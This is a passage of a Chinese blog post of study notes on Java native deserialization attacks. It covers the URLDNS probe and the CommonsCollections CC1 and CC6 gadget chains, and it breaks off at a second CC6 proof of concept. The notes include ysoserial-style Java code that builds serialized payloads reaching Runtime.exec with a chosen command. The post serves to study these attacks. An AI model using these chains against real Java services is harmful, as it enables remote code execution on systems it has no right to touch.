<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Java Sec —— 原生反序列化 | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Java Sec —— 原生反序列化</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-09T16:00:00.000Z" id="date"> 2023-08-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-10T15:25:49.882Z" id="updated"> 2023-08-10</time></div></span></div></div><hr><div id="post-content"><h1 id="Java-学习笔记——原生反序列化"><a href="#Java-学习笔记——原生反序列化" class="headerlink" title="Java 学习笔记——原生反序列化"></a>Java 学习笔记——原生反序列化</h1><blockquote>
<p>一个比较清楚的调用图 <a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/">https://boogipop.com/2023/03/02/Java反序列化研究/</a></p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled.png" alt="Untitled"></p>
</blockquote>
<p><strong>ps</strong>: 从 notion 中直接导出的，看着有点奇怪</p>
<h2 id="0x00-PHP-反序列化与-Java-反序列化的区别"><a href="#0x00-PHP-反序列化与-Java-反序列化的区别" class="headerlink" title="0x00. PHP 反序列化与 Java 反序列化的区别"></a>0x00. PHP 反序列化与 Java 反序列化的区别</h2><hr>
<p><strong><code>readObject</code></strong> 倾向于解决<strong>“反序列化时如何还原一个完整对象”</strong>这个问题<strong>，</strong>而 PHP 的 <strong>**<code>wakeup</code> 更倾向于解决“</strong>反序列化后如何初始化这个对象**”的问题。</p>
<h2 id="0x01-URLDNS-DNS-探测器"><a href="#0x01-URLDNS-DNS-探测器" class="headerlink" title="0x01. URLDNS DNS 探测器"></a>0x01. URLDNS DNS 探测器</h2><hr>
<ul>
<li><p>POC</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<pre><code>整个调用链过程：

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap-&gt;readObject()<br>HashMap-&gt;hash()<br>URL-&gt;hashCode()<br>URLStreamHandler-&gt;hashCode()<br>URLStreamHandler-&gt;getHostAddress()<br>InetAddress-&gt;getByName()<br></code></pre></td></tr></table></figure>
</code></pre><p>  sink 点： <code>java.net.URLStreamHandler#getHostAddress</code></p>
<pre><code>![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%201.png)

**细节**：为了防止在构造 POC 过程中触发 DNS 解析导致缓存，yso 作了如下设置

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>);  <span class="hljs-comment">// u: URL</span><br></code></pre></td></tr></table></figure>
原因在于 `java.net.URL#hashCode` 中会对 URL 实例的 hashCode 字段判断（如果已经对 url 作过 DNS 解析，则 hashCode 字段不等于 -1）

![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%202.png)
</code></pre><h2 id="0x02-CC1-work-on-JDK-≤-8u71"><a href="#0x02-CC1-work-on-JDK-≤-8u71" class="headerlink" title="0x02. CC1 (work on JDK ≤ 8u71)"></a>0x02. CC1 (work on JDK ≤ <strong><strong>8u71)</strong></strong></h2><hr>
<ul>
<li><p>限制条件</p>
<p>  <code>commons-collections:3.1</code> 组件</p>
<p>  JDK ≤ 8u71</p>
</li>
<li><p>Transformer 武器套件</p>
<p>   <code>ConstantTransformer</code> <code>InvokerTransformer</code> <code>ChainedTransformer</code></p>
</li>
<li><p>触发器</p>
<ul>
<li><p><code>TransformedMap</code></p>
<p>  TransformedMap 对 innerMap 作了修饰，传出的 outerMap 是修饰后的 Map</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, KeyTransformer, valueTransformer);<br></code></pre></td></tr></table></figure>
<blockquote>
<p>keyTransformer 是处理新元素 key 的回调，valueTransformer 是处理新元素 value 的回调；这里的回调并不是回调函数 而是一个实现了上面 Transformer 接口的类</p>
</blockquote>
</li>
<li><p><code>AnnotationInvocationHandler</code></p>
<p>  观察 readObject 方法：其中 <code>memberValues</code> 字段是我们可以设计好的 map（配合 <code>TransformedMap</code>）其会遍历元素并在满足一定条件后调用 <code>setValues</code> 方法，进而触发后续的利用链</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%203.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%203.png" alt="Untitled"></p>
<blockquote>
<p>条件是：</p>
<ul>
<li><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 构造函数的第一个参数为 Annotation 的子类，且必须至少含有一个方法，假设方法名为 X</li>
<li>被 <code>TransformedMap.decorate</code> 修饰的 Map 中必有一个键名为 X 的元素</li>
</ul>
<p>为什么呢？因为 <code>AnnotationInvocationHandler</code> 在执行 readObject 方法时，会获取到其构造方法时赋值好的字段 memberValue(Map) 和 type(Class&lt;? extends Annotation&gt;)，并枚举 map 的 key，实例化 type 并获取 key 同名属性，if 条件句会判断结果是否为 null 决定控制流的继续</p>
</blockquote>
<p>  注：这里选择的子类为 <code>java.lang.annotation.Retention</code> 其中包含一个方法 <code>value()</code> , 因此需要在 map 中存放一个键名同样为 value 的元素</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%204.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%204.png" alt="Untitled"></p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> InvocationHandler <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; command &#125;;<br>		<span class="hljs-comment">// inert chain for setup</span><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;);<br>		<span class="hljs-comment">// real chain for after setup</span><br>		<span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>						String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>						<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>						Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>						<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>						<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, execArgs),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;;<br><br>		<span class="hljs-type">HashMap</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>		innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);	<span class="hljs-comment">// 存放键名要求</span><br>		<span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br>		<br>		<span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) Reflections.newInstance(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>, Retention.class, outerMap);<br>		Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br><br>		<span class="hljs-keyword">return</span> handler;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>&gt; 注：版本修复：8u71 以后，新建了一个 `linkedHashMap` 对象，并将原来的键值添加进去。 所以后续对 Map 的操作都是基于这个新的 `LinkedHashMap` 对象，而原来我们精心构造的 Map 不再执行 set 或 put 操作，也就不会触发 RCE 了
&gt; 
- LazyMap

    `LazyMap#get()` 方法中会调用 factory(`Transformer类`) 字段的 transform 方法，当设计为我们构造的 gadget 时，便可触发 RCE

    ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%205.png)

    那么接下来就是寻找可以触发 get 方法的调用点

    yso 的利用构造过程如下：

    1. 首先将经过 LazyMap 修饰过的 HashMap 作一层代理

        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);<br></code></pre></td></tr></table></figure>

    2. 接下来再进一步包装 mapProxy，将其装入`AnnotationInvocationHandler` 的 `memberValues` 字段，等待反序列化时被触发，调用 invoke 方法执行代理逻辑

        进而其中的 lazyMap 会触发 get 方法执行 RCE gadget

        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);<br></code></pre></td></tr></table></figure>

        ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%206.png)


    <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>		ObjectInputStream.readObject()<br>			AnnotationInvocationHandler.readObject()<br>				Map(Proxy).entrySet()<br>					AnnotationInvocationHandler.invoke()<br>						LazyMap.get()<br>							ChainedTransformer.transform()<br>								ConstantTransformer.transform()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Class.getMethod()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.getRuntime()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.exec()<br></code></pre></td></tr></table></figure>


**总结一下**两层 AnnotationInvocationHandler 的作用：内层作用的是动态代理，为了能调用到 invoke 方法进而触发到 `lazymap.get()` 而外层的 AnnotationInvocationHandler 主要是为了作反序列化入口
</code></pre><h2 id="0x03-CC6-突破-AnnotationInvocationHandler-高版本限制"><a href="#0x03-CC6-突破-AnnotationInvocationHandler-高版本限制" class="headerlink" title="0x03. CC6 突破 AnnotationInvocationHandler 高版本限制"></a>0x03. CC6 突破 <code>AnnotationInvocationHandler</code> 高版本限制</h2><hr>
<ul>
<li><p>限制条件</p>
<p>  <code>commons-collections:3.1</code> </p>
<p>  无 jdk 版本限制</p>
</li>
<li><p>新的触发器</p>
<ul>
<li><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
<p>  其 hashCode 方法中会调用 <code>getValue()</code> 方法，进一步调用字段 map 的 get 方法</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%207.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%207.png" alt="Untitled"></p>
</li>
<li><p><strong>新的入口点</strong>：HashSet（不再使用 <code>AnnotationInvocationHandler</code> 作为入口点，或者将 <strong>HashMap</strong> 直接作为入口也可以）</p>
<p>  我们知道 HashSet 其内部实际也是维护了一个 HashMap （忽略了value而已）数据结构，因此在反序列化 <code>readObject</code> 过程中同样也会触发对于 key 的 hashCode 操作</p>
</li>
<li><p>POC</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Serializable <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; command &#125;;<br><br>        <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                        String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                        Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, execArgs),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        map.add(<span class="hljs-string">&quot;foo&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 先拿到内部的 HashMap 成员 instance</span><br>        Reflections.setAccessible(f);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innimpl</span> <span class="hljs-operator">=</span> (HashMap) f.get(map);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);<br>        &#125;<br><br>        Reflections.setAccessible(f2);<br>        Object[] array = (Object[]) f2.get(innimpl);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">null</span>)&#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br><br>        Reflections.setAccessible(keyField);<br>        keyField.set(node, entry);<br><br>        <span class="hljs-keyword">return</span> map;<br><br>    &#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    这里实际构造的稍微复杂了点，因为构造好的 `TiedMapEntry` 需要放到 HashSet 内部正确的位置上，即：

    <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet -&gt; HashMap -&gt; Node&lt;K, V&gt; -&gt; K key<br></code></pre></td></tr></table></figure>

    因此还可以简化设计：直接将 HashMap 作为入口点

    - Java Poc2

